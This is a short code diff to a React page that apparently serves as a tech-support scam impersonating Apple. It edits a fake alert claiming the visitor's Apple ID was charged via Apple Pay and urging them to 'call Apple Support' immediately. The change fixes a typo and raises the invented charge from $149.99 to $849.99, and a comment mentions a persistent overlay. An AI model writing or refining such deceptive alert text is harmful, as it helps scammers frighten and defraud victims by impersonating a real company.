@@ -140,7 +140,7 @@ function App() {
 
         <LocalNav />
         <Banner />
-        <p className="text-center text-black text-lg tracking-wide px-4 mt-8 mb-4 max-w-2xl mx-auto">Your iPh Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization! We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support to Freeze it!</p>
+        <p className="text-center text-black text-lg tracking-wide px-4 mt-8 mb-4 max-w-2xl mx-auto">Your Apple ID was recently used at APPLE STORE for $849.99 Via Apple Pay Pre-Authorization! We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support to Freeze it!</p>
       </div>
       <Footer />
       {/* Persistent Overlay logic if needed, but body click handles it */}
